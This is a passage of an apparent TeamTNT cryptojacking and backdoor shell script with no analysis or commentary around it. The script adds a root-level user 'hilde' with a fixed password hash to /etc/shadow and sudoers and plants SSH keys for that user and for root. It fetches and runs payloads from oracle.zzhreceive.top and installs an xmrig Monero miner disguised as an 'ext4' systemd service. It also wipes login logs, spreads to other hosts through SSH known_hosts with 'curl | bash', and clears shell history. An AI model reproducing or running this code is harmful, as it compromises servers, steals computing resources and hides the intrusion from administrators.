grep -q hilde /etc/shadow || tntrecht -ia /etc/shadow; 
grep -q hilde /etc/shadow || echo 'hilde:$6$7n/iy4R6znS2iq0J$QjcECLSqMMiUUeHR4iJmkHLzAwgoNRhCC87HI3df95nZH5569TKwJEN2I/lNanPe0vhsdgfILPXedlWlZn7lz0:18461:0:99999:7:::' >> /etc/shadow; chattr +ia /etc/shadow; tntrecht +ia /etc/shadow
grep -q hilde /etc/sudoers || chattr -ia /etc/sudoers; 
grep -q hilde /etc/sudoers || tntrecht -ia /etc/sudoers; 
grep -q hilde /etc/sudoers || echo 'hilde  ALL=(ALL:ALL) ALL' >> /etc/sudoers; chattr +i /etc/sudoers; tntrecht +i /etc/sudoers

mkdir /home/hilde/.ssh/ -p  
touch /home/hilde/.ssh/authorized_keys  
touch /home/hilde/.ssh/authorized_keys2  
chmod 600 /home/hilde/.ssh/authorized_keys
chmod 600 /home/hilde/.ssh/authorized_keys2
grep -q root@puppetserver /home/hilde/.ssh/authorized_keys || chattr -ia /home/hilde/.ssh/authorized_keys; 
grep -q root@puppetserver /home/hilde/.ssh/authorized_keys || tntrecht -ia /home/hilde/.ssh/authorized_keys; 
grep -q root@puppetserver /home/hilde/.ssh/authorized_keys || echo $RSAKEY > /home/hilde/.ssh/authorized_keys; chattr +ia /home/hilde/.ssh/authorized_keys; tntrecht +ia /home/hilde/.ssh/authorized_keys;
grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 || chattr -ia /home/hilde/.ssh/authorized_keys2; 
grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 || tntrecht -ia /home/hilde/.ssh/authorized_keys2; 
grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 || echo $RSAKEY > /home/hilde/.ssh/authorized_keys2; chattr +ia /home/hilde/.ssh/authorized_keys2; tntrecht +ia /home/hilde/.ssh/authorized_keys2;
mkdir /root/.ssh/ -p  
touch /root/.ssh/authorized_keys  
touch /root/.ssh/authorized_keys2
chmod 600 /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys2
grep -q root@puppetserver /root/.ssh/authorized_keys || chattr -ia /root/.ssh/authorized_keys; 
grep -q root@puppetserver /root/.ssh/authorized_keys || tntrecht -ia /root/.ssh/authorized_keys; 
grep -q root@puppetserver /root/.ssh/authorized_keys || echo $RSAKEY >> /root/.ssh/authorized_keys; chattr +ia /root/.ssh/authorized_keys; tntrecht +ia /root/.ssh/authorized_keys
grep -q root@puppetserver /root/.ssh/authorized_keys2 || chattr -ia /root/.ssh/authorized_keys2; 
grep -q root@puppetserver /root/.ssh/authorized_keys2 || tntrecht -ia /root/.ssh/authorized_keys2; 
grep -q root@puppetserver /root/.ssh/authorized_keys2 || echo $RSAKEY > /root/.ssh/authorized_keys2; chattr +ia /root/.ssh/authorized_keys2; tntrecht +ia /root/.ssh/authorized_keys2
}

function setupmyapps(){
	
function loadthisfile(){
GETFROM=$1
PUTITTO=$2

if [ -f "$PUTITTO" ]; then
chattr -i $PUTITTO 2>/dev/null 1>/dev/null
tntrecht -i $PUTITTO 2>/dev/null 1>/dev/null
rm -f $PUTITTO 2>/dev/null 1>/dev/null
fi

REFERER=$(cat /etc/ssh/sshd_config|grep -v grep | grep "Port "| awk '{print $2}')
WGETPARA="--max-redirect 5 --no-check-certificate --quiet"
CURLPARA="-L --max-redirs 5 --insecure --silent"

curl --referer $REFERER --user-agent TNTcurl $CURLPARA $GETFROM -o $PUTITTO  || cdl --referer $REFERER --user-agent TNTcurl $CURLPARA $GETFROM -o $PUTITTO  || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO || wdl --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO 
}	



if [ -f "/usr/bin/bioset" ]; then
echo 'FOUND: bioset'
else
echo 'MISSING: bioset'
loadthisfile  http://oracle.zzhreceive.top/b2f628/bioset.jpg /usr/bin/bioset
chmod +x /usr/bin/bioset
/usr/bin/bioset
fi
}

function checksshkeys(){
if [ -f /var/tmp/.system/[ext4].log ]; then
curl  http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
cur http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
cd1 http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
TNTcurl http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
wget -q -O- http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
wge -q -O- http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
wd1 -q -O- http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/cryptostart >>/dev/null
else 
curl  http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
cur http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
cd1 http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
TNTcurl http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
wget -q -O- http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
wge -q -O- http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
wd1 -q -O- http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/cryptonotfount >>/dev/null
fi
cat /home/hilde/.ssh/authorized_keys|grep root@puppetserver >/dev/null
if (test $? -ne 0); then
curl  http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
cur http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
cd1 http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
TNTcurl http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
wget -q -O- http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
wge -q -O- http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
wd1 -q -O- http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authfailed >>/dev/null
else
curl  http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
cur http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
cd1 http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
TNTcurl http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
wget -q -O- http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
wge -q -O- http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
wd1 -q -O- http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authok >>/dev/null
fi

cat /root/.ssh/authorized_keys|grep root@puppetserver >/dev/null
if (test $? -ne 0); then
curl  http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
cur http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
cd1 http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
TNTcurl http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
wget -q -O- http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
wge -q -O- http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
wd1 -q -O- http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
else
curl  http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
cur http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
cd1 http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
TNTcurl http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
wget -q -O- http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
wge -q -O- http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
wd1 -q -O- http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
fi
}

function SetupMoneroOcean(){
function SetupMoneroOcean1(){
# printing intentions
echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "$MOxmrigMOD" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download $MOxmrigMOD file to /tmp/xmrig.tar.gz"
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $MOHOME/"
[ -d $MOHOME/ ] || mkdir $MOHOME/
if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $MOHOME/ directory"
fi
chmod +x $MOHOME/\[ext4\]
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $MOHOME/xmrig works fine (and not removed by antivirus software)"
$MOHOME/[ext4] --help >/dev/null
if (test $? -ne 0); then
  if [ -f $MOHOME/[ext4] ]; then
    echo "WARNING: Advanced version of $MOHOME/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $MOHOME/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  #LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE=$MOxmrigSTOCK

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $MOHOME/"
  if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/ --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $MOHOME/ directory"
  fi
  rm /tmp/xmrig.tar.gz
chmod +x $MOHOME/\[ext4\]

  echo "[*] Checking if stock version is OKAY!"
  $MOHOME/[ext4] --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $MOHOME/[ext4] ]; then
      echo "ERROR: Stock version of $MOHOME/[ext4] is not functional too"
    else 
      echo "ERROR: Stock version of $MOHOME/[ext4] was removed by antivirus too"
    fi
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
  fi
fi

echo "[*] $MOHOME/[ext4] is OK"
}

######################### printing greetings ###########################
clear
echo -e " "
echo -e "                                \e[1;34;49m___________                 _____________________________\033[0m"
echo -e "                                \e[1;34;49m\__    ___/___ _____    ____\__    ___/\      \__    ___/\033[0m"
echo -e "                                \e[1;34;49m  |    |_/ __ \\__  \  /     \|    |   /   |   \|    |   \033[0m"
echo -e "                                \e[1;34;49m  |    |\  ___/ / __ \|  Y Y  \    |  /    |    \    |   \033[0m"
echo -e "                                \e[1;34;49m  |____| \___  >____  /__|_|  /____|  \____|__  /____|   \033[0m"
echo -e "                                \e[1;34;49m             \/     \/      \/                \/         \033[0m"
echo -e " "
echo -e "                                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "
echo -e " "
echo -e "                                \e[1;34;49m            Now you get, what i want to give... --- '''      \033[0m"
echo " "
echo " "



if [ "$(id -u)" == "0" ]; then
  echo "running as root... its all OKAY!"
else
  echo "running not as root... first starting tmp setup..."
fi


# checking prerequisites

if [ -z $WALLET ]; then
  echo "ERROR: wallet"
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 95): ${#WALLET_BASE}"
fi

if [ -z $MOHOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
fi

if [ ! -d $MOHOME ]; then
  echo "ERROR: Please make sure HOME directory $MOHOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
fi


if ! type curl >/dev/null; then
apt-get update --fix-missing 2>/dev/null 1>/dev/null
apt-get install -y curl 2>/dev/null 1>/dev/null
apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null
yum clean all 2>/dev/null 1>/dev/null
yum install -y curl 2>/dev/null 1>/dev/null
yum reinstall -y curl 2>/dev/null 1>/dev/null
fi

sleep 2
$MOHOME/[ext4] --help >/dev/null
if (test $? -ne 0); then
    SetupMoneroOcean1
else
    echo "WARNING: Advanced version of $MOHOME/xmrig was removed by antivirus (or some other problem)"
fi

if [ -f "$MOHOME/[ext4].pid" ]
 then
         echo "config file exists, neednot backup"
 else
         echo "config file not exists.download from teamtnt"
         SetupMoneroOcean1
fi


if [ -f "$MOHOME/[ext4]" ]
 then
         echo "miner file exists"
 else
         curl -L --progress-bar $miner_url -o /tmp/xmrig.tar.gz && tar -xf /tmp/xmrig.tar.gz -C $MOHOME/ && mv $MOHOME/xmrig*/xmrig  $MOHOME/\[ext4\]
fi

if [ -f "$MOHOME/[ext4].pid" ]
then
    echo "miner config exists"
else
    curl -L --progress-bar $config_url -o  $MOHOME/\[ext4\].pid
fi

rm /tmp/xmrig.tar.gz

if [ -f "$MOHOME/[ext4]" ]
 then
         echo "miner file exists, neednot backup"
 else
         curl -L --progress-bar $miner_url_backup -o  /tmp/xmrig.tar.gz && tar -xf /tmp/xmrig.tar.gz -C $MOHOME/ && chmod +x $MOHOME/\[ext4\]
fi

rm /tmp/cf.tar


sed -i 's/"url": *"[^"]*",/"url": "xmr-asia1.nanopool.org:14444",/' $MOHOME/[ext4].pid
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $MOHOME/[ext4].pid
sed -i 's/"coin": *[^"]*,/"coin": "monero",/' $MOHOME/[ext4].pid
sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 50,/' $MOHOME/[ext4].pid
sed -i 's#"log-file": *null,#"log-file": "'$MOHOME/[ext4].log'",#' $MOHOME/[ext4].pid
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $MOHOME/[ext4].pid

cp $MOHOME/[ext4].pid $MOHOME/config_background.json
sed -i 's/"background": *false,/"background": true,/' $MOHOME/config_background.json

# preparing script

echo "[*] Creating $MOHOME/[ext4].sh script"
cat >$MOHOME/[ext4].sh <<EOL
#!/bin/bash
if ! pidof [ext4] >/dev/null; then
  nice $MOHOME/[ext4] \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $MOHOME/[ext4].sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep $MOHOME/[ext4].sh /root/.profile >/dev/null; then
    echo "[*] Adding $MOHOME/[ext4].sh script to /root/.profile"
    echo "$MOHOME/[ext4].sh --config=$MOHOME/config_background.json >/dev/null 2>&1" >>/root/.profile
  else 
    echo "Looks like $MOHOME/[ext4].sh script is already in the /root/.profile"
  fi
  echo "[*] Running ext4 service in the background (see logs in $MOHOME/[ext4].log file)"
  /bin/bash $MOHOME/[ext4].sh --config=$MOHOME/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    /bin/bash $MOHOME/[ext4].sh --config=$MOHOME/config_background.json >/dev/null 2>&1

  else

    echo "[*] Creating ext4 systemd service"
chmod +x /usr/bin/systemctl
    cat >/tmp/ext4.service <<EOL
[Unit]
Description=ext4 system service

[Service]
ExecStart=$MOHOME/[ext4] --config=$MOHOME/[ext4].pid
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/ext4.service /etc/systemd/system/ext4.service
    echo "[*] Starting ext4 systemd service"
    sudo killall [ext4] 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable ext4.service
    sudo systemctl start ext4.service
  fi
fi

}

localgo() {
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o-  http://oracle.zzhreceive.top/b2f628/b.sh | bash >/dev/null 2>&1 &' & done
fi
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'cd1 -o-  http://oracle.zzhreceive.top/b2f628/b.sh | bash >/dev/null 2>&1 &' & done
fi
}

KILLMININGSERVICES

SetupMoneroOcean

makesshaxx

installdia

setupmyapps

checksshkeys

SecureTheSystem

FixTheSystem

if [ ! -f "/var/tmp/.alsp" ]; then
localgo
echo 'lockfile' > /var/tmp/.alsp
tntrecht +i /var/tmp/.alsp || chattr +i /var/tmp/.alsp
else
echo "replay .. i know this server ..."
exit
fi

echo ""
echo "[*] Setup complete"
curl -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/iss.sh | bash || cd1 -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/iss.sh | bash
history -c

## now the bad part of the script###

